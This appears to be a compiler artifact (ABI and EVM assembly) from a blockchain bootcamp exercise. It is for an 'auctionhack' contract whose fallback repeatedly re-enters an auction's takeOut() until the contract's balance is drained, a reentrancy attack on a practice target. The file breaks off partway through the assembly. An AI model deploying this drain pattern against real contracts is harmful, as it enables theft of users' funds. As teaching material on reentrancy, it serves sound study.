{
	"bootcamp/week9/day_2_Auction_Hack.sol": {
		"auctionhack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_address",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "auctioncontract",
					"outputs": [
						{
							"internalType": "contract auction",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "bid",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "loop",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "loopCounter",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "takeOut2",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":286:2256  contract auctionhack {... */\n  mstore(0x40, 0x80)\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":398:399  0 */\n  0x00\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":379:399  uint public loop = 0 */\n  0x02\n  sstore\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":455:537  constructor(address _address) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":521:529  _address */\n  dup1\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":495:510  auctioncontract */\n  0x00\n  dup1\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":495:530  auctioncontract = auction(_address) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":455:537  constructor(address _address) {... */\n  pop\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":286:2256  contract auctionhack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"bootcamp/week9/day_2_Auction_Hack.sol\":286:2256  contract auctionhack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":286:2256  contract auctionhack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1998aeef\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x81fe7719\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xa92100cb\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xe29e271d\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xfd192820\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1989:2000  loopCounter */\n      sload(0x01)\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1982:1986  loop */\n      sload(0x02)\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1982:2000  loop < loopCounter */\n      lt\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1978:2073  if (loop < loopCounter) {... */\n      iszero\n      tag_10\n      jumpi\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":2022:2023  1 */\n      0x01\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":2016:2020  loop */\n      0x02\n      0x00\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":2016:2023  loop+=1 */\n      dup3\n      dup3\n      sload\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":2037:2052  auctioncontract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":2037:2060  auctioncontract.takeOut */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x6faf0397\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":2037:2062  auctioncontract.takeOut() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n      pop\n      pop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1978:2073  if (loop < loopCounter) {... */\n    tag_10:\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":286:2256  contract auctionhack {... */\n      stop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1556:1642  function bid() public payable {... */\n    tag_3:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      stop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":313:343  auction public auctioncontract */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      pop\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":379:399  uint public loop = 0 */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      tag_26\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":603:1498  function takeOut2() public {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      stop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":350:373  uint public loopCounter */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_31\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_31:\n      pop\n      tag_32\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      tag_34\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1556:1642  function bid() public payable {... */\n    tag_17:\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1596:1611  auctioncontract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1596:1615  auctioncontract.bid */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1998aeef\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1623:1632  msg.value */\n      callvalue\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1596:1635  auctioncontract.bid{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_36:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_38:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1556:1642  function bid() public payable {... */\n      jump\t// out\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":313:343  auction public auctioncontract */\n    tag_20:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":379:399  uint public loop = 0 */\n    tag_25:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":603:1498  function takeOut2() public {... */\n    tag_30:\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1232:1233  1 */\n      0x01\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1201:1216  auctioncontract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1201:1227  auctioncontract.getBalance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x12065fe0\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1201:1229  auctioncontract.getBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_42\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1174:1189  auctioncontract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1166:1198  address(auctioncontract).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1166:1229  address(auctioncontract).balance / auctioncontract.getBalance() */\n      tag_44\n      swap2\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1166:1233  address(auctioncontract).balance / auctioncontract.getBalance() - 1 */\n      tag_46\n      swap2\n      swap1\n      tag_47\n      jump\t// in\n    tag_46:\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1152:1163  loopCounter */\n      0x01\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1152:1233  loopCounter = address(auctioncontract).balance / auctioncontract.getBalance() - 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1466:1481  auctioncontract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1466:1489  auctioncontract.takeOut */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x6faf0397\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":1466:1491  auctioncontract.takeOut() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":603:1498  function takeOut2() public {... */\n      jump\t// out\n        /* \"bootcamp/week9/day_2_Auction_Hack.sol\":350:373  uint public loopCounter */\n    tag_33:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_51:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:270   */\n    tag_52:\n        /* \"#utility.yul\":138:215   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":135:136   */\n      0x00\n        /* \"#utility.yul\":128:216   */\n      mstore\n        /* \"#utility.yul\":235:239   */\n      0x11\n        /* \"#utility.yul\":232:233   */\n      0x04\n        /* \"#utility.yul\":225:240   */\n      mstore\n        /* \"#utility.yul\":259:263   */\n      0x24\n        /* \"#utility.yul\":256:257   */\n      0x00\n        /* \"#utility.yul\":249:264   */\n      revert\n        /* \"#utility.yul\":276:467   */\n    tag_12:\n        /* \"#utility.yul\":316:319   */\n      0x00\n        /* \"#utility.yul\":335:355   */\n      tag_70\n        /* \"#utility.yul\":353:354   */\n      dup3\n        /* \"#utility.yul\":335:355   */\n      tag_51\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":330:355   */\n      swap2\n      pop\n        /* \"#utility.yul\":369:389   */\n      tag_71\n        /* \"#utility.yul\":387:388   */\n      dup4\n        /* \"#utility.yul\":369:389   */\n      tag_51\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":364:389   */\n      swap3\n      pop\n        /* \"#utility.yul\":412:413   */\n      dup3\n        /* \"#utility.yul\":409:410   */\n      dup3\n        /* \"#utility.yul\":405:414   */\n      add\n        /* \"#utility.yul\":398:414   */\n      swap1\n      pop\n        /* \"#utility.yul\":433:436   */\n      dup1\n        /* \"#utility.yul\":430:431   */\n      dup3\n        /* \"#utility.yul\":427:437   */\n      gt\n        /* \"#utility.yul\":424:460   */\n      iszero\n      tag_72\n      jumpi\n        /* \"#utility.yul\":440:458   */\n      tag_73\n      tag_52\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":424:460   */\n    tag_72:\n        /* \"#utility.yul\":276:467   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":473:599   */\n    tag_53:\n        /* \"#utility.yul\":510:517   */\n      0x00\n        /* \"#utility.yul\":550:592   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":543:548   */\n      dup3\n        /* \"#utility.yul\":539:593   */\n      and\n        /* \"#utility.yul\":528:593   */\n      swap1\n      pop\n        /* \"#utility.yul\":473:599   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":605:665   */\n    tag_54:\n        /* \"#utility.yul\":633:636   */\n      0x00\n        /* \"#utility.yul\":654:659   */\n      dup2\n        /* \"#utility.yul\":647:659   */\n      swap1\n      pop\n        /* \"#utility.yul\":605:665   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":671:813   */\n    tag_55:\n        /* \"#utility.yul\":721:730   */\n      0x00\n        /* \"#utility.yul\":754:807   */\n      tag_77\n        /* \"#utility.yul\":772:806   */\n      tag_78\n        /* \"#utility.yul\":781:805   */\n      tag_79\n        /* \"#utility.yul\":799:804   */\n      dup5\n        /* \"#utility.yul\":781:805   */\n      tag_53\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":772:806   */\n      tag_54\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":754:807   */\n      tag_53\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":741:807   */\n      swap1\n      pop\n        /* \"#utility.yul\":671:813   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":819:945   */\n    tag_56:\n        /* \"#utility.yul\":869:878   */\n      0x00\n        /* \"#utility.yul\":902:939   */\n      tag_81\n        /* \"#utility.yul\":933:938   */\n      dup3\n        /* \"#utility.yul\":902:939   */\n      tag_55\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":889:939   */\n      swap1\n      pop\n        /* \"#utility.yul\":819:945   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":951:1091   */\n    tag_57:\n        /* \"#utility.yul\":1015:1024   */\n      0x00\n        /* \"#utility.yul\":1048:1085   */\n      tag_83\n        /* \"#utility.yul\":1079:1084   */\n      dup3\n        /* \"#utility.yul\":1048:1085   */\n      tag_56\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":1035:1085   */\n      swap1\n      pop\n        /* \"#utility.yul\":951:1091   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1097:1256   */\n    tag_58:\n        /* \"#utility.yul\":1198:1249   */\n      tag_85\n        /* \"#utility.yul\":1243:1248   */\n      dup2\n        /* \"#utility.yul\":1198:1249   */\n      tag_57\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":1193:1196   */\n      dup3\n        /* \"#utility.yul\":1186:1250   */\n      mstore\n        /* \"#utility.yul\":1097:1256   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1262:1512   */\n    tag_22:\n        /* \"#utility.yul\":1369:1373   */\n      0x00\n        /* \"#utility.yul\":1407:1409   */\n      0x20\n        /* \"#utility.yul\":1396:1405   */\n      dup3\n        /* \"#utility.yul\":1392:1410   */\n      add\n        /* \"#utility.yul\":1384:1410   */\n      swap1\n      pop\n        /* \"#utility.yul\":1420:1505   */\n      tag_87\n        /* \"#utility.yul\":1502:1503   */\n      0x00\n        /* \"#utility.yul\":1491:1500   */\n      dup4\n        /* \"#utility.yul\":1487:1504   */\n      add\n        /* \"#utility.yul\":1478:1484   */\n      dup5\n        /* \"#utility.yul\":1420:1505   */\n      tag_58\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":1262:1512   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1518:1636   */\n    tag_59:\n        /* \"#utility.yul\":1605:1629   */\n      tag_89\n        /* \"#utility.yul\":1623:1628   */\n      dup2\n        /* \"#utility.yul\":1605:1629   */\n      tag_51\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1600:1603   */\n      dup3\n        /* \"#utility.yul\":1593:1630   */\n      mstore\n        /* \"#utility.yul\":1518:1636   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1642:1864   */\n    tag_27:\n        /* \"#utility.yul\":1735:1739   */\n      0x00\n        /* \"#utility.yul\":1773:1775   */\n      0x20\n        /* \"#utility.yul\":1762:1771   */\n      dup3\n        /* \"#utility.yul\":1758:1776   */\n      add\n        /* \"#utility.yul\":1750:1776   */\n      swap1\n      pop\n        /* \"#utility.yul\":1786:1857   */\n      tag_91\n        /* \"#utility.yul\":1854:1855   */\n      0x00\n        /* \"#utility.yul\":1843:1852   */\n      dup4\n        /* \"#utility.yul\":1839:1856   */\n      add\n        /* \"#utility.yul\":1830:1836   */\n      dup5\n        /* \"#utility.yul\":1786:1857   */\n      tag_59\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":1642:1864   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1951:2068   */\n    tag_61:\n        /* \"#utility.yul\":2060:2061   */\n      0x00\n        /* \"#utility.yul\":2057:2058   */\n      dup1\n        /* \"#utility.yul\":2050:2062   */\n      revert\n        /* \"#utility.yul\":2197:2319   */\n    tag_63:\n        /* \"#utility.yul\":2270:2294   */\n      tag_96\n        /* \"#utility.yul\":2288:2293   */\n      dup2\n        /* \"#utility.yul\":2270:2294   */\n      tag_51\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":2263:2268   */\n      dup2\n        /* \"#utility.yul\":2260:2295   */\n      eq\n        /* \"#utility.yul\":2250:2313   */\n      tag_97\n      jumpi\n        /* \"#utility.yul\":2309:2310   */\n      0x00\n        /* \"#utility.yul\":2306:2307   */\n      dup1\n        /* \"#utility.yul\":2299:2311   */\n      revert\n        /* \"#utility.yul\":2250:2313   */\n    tag_97:\n        /* \"#utility.yul\":2197:2319   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2325:2468   */\n    tag_64:\n        /* \"#utility.yul\":2382:2387   */\n      0x00\n        /* \"#utility.yul\":2413:2419   */\n      dup2\n        /* \"#utility.yul\":2407:2420   */\n      mload\n        /* \"#utility.yul\":2398:2420   */\n      swap1\n      pop\n        /* \"#utility.yul\":2429:2462   */\n      tag_99\n        /* \"#utility.yul\":2456:2461   */\n      dup2\n        /* \"#utility.yul\":2429:2462   */\n      tag_63\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2325:2468   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2474:2825   */\n    tag_43:\n        /* \"#utility.yul\":2544:2550   */\n      0x00\n        /* \"#utility.yul\":2593:2595   */\n      0x20\n        /* \"#utility.yul\":2581:2590   */\n      dup3\n        /* \"#utility.yul\":2572:2579   */\n      dup5\n        /* \"#utility.yul\":2568:2591   */\n      sub\n        /* \"#utility.yul\":2564:2596   */\n      slt\n        /* \"#utility.yul\":2561:2680   */\n      iszero\n      tag_101\n      jumpi\n        /* \"#utility.yul\":2599:2678   */\n      tag_102\n      tag_61\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":2561:2680   */\n    tag_101:\n        /* \"#utility.yul\":2719:2720   */\n      0x00\n        /* \"#utility.yul\":2744:2808   */\n      tag_103\n        /* \"#utility.yul\":2800:2807   */\n      dup5\n        /* \"#utility.yul\":2791:2797   */\n      dup3\n        /* \"#utility.yul\":2780:2789   */\n      dup6\n        /* \"#utility.yul\":2776:2798   */\n      add\n        /* \"#utility.yul\":2744:2808   */\n      tag_64\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":2734:2808   */\n      swap2\n      pop\n        /* \"#utility.yul\":2690:2818   */\n      pop\n        /* \"#utility.yul\":2474:2825   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2831:3011   */\n    tag_65:\n        /* \"#utility.yul\":2879:2956   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2876:2877   */\n      0x00\n        /* \"#utility.yul\":2869:2957   */\n      mstore\n        /* \"#utility.yul\":2976:2980   */\n      0x12\n        /* \"#utility.yul\":2973:2974   */\n      0x04\n        /* \"#utility.yul\":2966:2981   */\n      mstore\n        /* \"#utility.yul\":3000:3004   */\n      0x24\n        /* \"#utility.yul\":2997:2998   */\n      0x00\n        /* \"#utility.yul\":2990:3005   */\n      revert\n        /* \"#utility.yul\":3017:3202   */\n    tag_45:\n        /* \"#utility.yul\":3057:3058   */\n      0x00\n        /* \"#utility.yul\":3074:3094   */\n      tag_106\n        /* \"#utility.yul\":3092:3093   */\n      dup3\n        /* \"#utility.yul\":3074:3094   */\n      tag_51\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":3069:3094   */\n      swap2\n      pop\n        /* \"#utility.yul\":3108:3128   */\n      tag_107\n        /* \"#utility.yul\":3126:3127   */\n      dup4\n        /* \"#utility.yul\":3108:3128   */\n      tag_51\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":3103:3128   */\n      swap3\n      pop\n        /* \"#utility.yul\":3147:3148   */\n      dup3\n        /* \"#utility.yul\":3137:3172   */\n      tag_108\n      jumpi\n        /* \"#utility.yul\":3152:3170   */\n      tag_109\n      tag_65\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":3137:3172   */\n    tag_108:\n        /* \"#utility.yul\":3194:3195   */\n      dup3\n        /* \"#utility.yul\":3191:3192   */\n      dup3\n        /* \"#utility.yul\":3187:3196   */\n      div\n        /* \"#utility.yul\":3182:3196   */\n      swap1\n      pop\n        /* \"#utility.yul\":3017:3202   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3208:3402   */\n    tag_47:\n        /* \"#utility.yul\":3248:3252   */\n      0x00\n        /* \"#utility.yul\":3268:3288   */\n      tag_111\n        /* \"#utility.yul\":3286:3287   */\n      dup3\n        /* \"#utility.yul\":3268:3288   */\n      tag_51\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":3263:3288   */\n      swap2\n      pop\n        /* \"#utility.yul\":3302:3322   */\n      tag_112\n        /* \"#utility.yul\":3320:3321   */\n      dup4\n        /* \"#utility.yul\":3302:3322   */\n      tag_51\n      jump\t// in\n    